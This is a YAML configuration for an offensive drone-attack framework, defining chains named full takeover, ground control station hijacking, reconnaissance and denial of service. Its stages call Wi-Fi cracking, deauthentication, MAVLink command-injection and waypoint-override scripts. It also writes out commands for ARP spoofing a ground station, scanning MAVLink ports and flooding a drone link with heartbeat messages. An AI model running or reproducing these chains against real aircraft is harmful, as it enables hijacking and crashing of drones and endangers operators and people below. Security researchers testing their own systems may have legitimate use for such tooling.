chains:
  full_takeover:
    name: "Full Takeover Attack Chain"
    description: "Complete drone takeover: Wi-Fi crack → MAVLink inject → Mission override → Log exfiltration"
    stages:
      - name: "Wi-Fi Network Cracking"
        type: "script"
        script: "../recon/wifi_crack.py"
        args: ["${interface}", "${ssid}", "${channel}", "${bssid}"]
        required: true
        delay: 5
    
      - name: "Drone Discovery"
        type: "script"
        script: "../recon/drone_discovery.py"
        args: ["${network}"]
        required: true
        delay: 2
    
      - name: "Wait for Connection"
        type: "wait"
        duration: 10
        required: false
    
      - name: "MAVLink Command Injection"
        type: "script"
        script: "../injection/mavlink_inject.py"
        args: ["${connection}", "SET_MODE"]
        required: true
        delay: 3
    
      - name: "Waypoint Override"
        type: "script"
        script: "../injection/waypoint_override.py"
        args: ["${connection}", "${lat1}", "${lon1}", "${alt1}"]
        required: true
        delay: 2
    
      - name: "Mission Extraction"
        type: "command"
        command: "pymavlink mission download ${connection}"
        required: false

  gcs_hijack:
    name: "Ground Control Station Hijacking"
    description: "Hijack GCS communication and take control"
    stages:
      - name: "Wi-Fi Cracking"
        type: "script"
        script: "../recon/wifi_crack.py"
        args: ["${interface}", "${ssid}"]
        required: true
        delay: 5
    
      - name: "GCS Deauthentication"
        type: "script"
        script: "../dos/wifi_deauth.py"
        args: ["${interface}", "${gcs_mac}"]
        required: true
        delay: 3
    
      - name: "ARP Spoofing Setup"
        type: "command"
        command: "arpspoof -i ${interface} -t ${gcs_ip} -r ${gateway_ip}"
        required: true
        delay: 2
    
      - name: "Take Control"
        type: "script"
        script: "../injection/mavlink_inject.py"
        args: ["${connection}", "SET_MODE"]
        required: true

  reconnaissance_chain:
    name: "Comprehensive Reconnaissance"
    description: "Gather all available information about target"
    stages:
      - name: "Network Discovery"
        type: "script"
        script: "../recon/drone_discovery.py"
        args: ["${network}"]
        required: true
        delay: 2
    
      - name: "Wi-Fi Analysis"
        type: "script"
        script: "../recon/wifi_crack.py"
        args: ["${interface}", "${ssid}"]
        required: false
        delay: 5
    
      - name: "Port Scanning"
        type: "command"
        command: "nmap -p 14550,14540,5760 ${target_ip}"
        required: false

  dos_chain:
    name: "Denial of Service Attack"
    description: "Disrupt drone operations through DoS attacks"
    stages:
      - name: "Wi-Fi Deauthentication"
        type: "script"
        script: "../dos/wifi_deauth.py"
        args: ["${interface}", "${target_mac}", "100"]
        required: true
        delay: 5
    
      - name: "Communication Flooding"
        type: "command"
        command: "python3 -c 'from pymavlink import mavutil; m = mavutil.mavlink_connection(\"${connection}\"); [m.mav.heartbeat_send(1,1,0,0,0) for _ in range(1000)]'"
        required: false
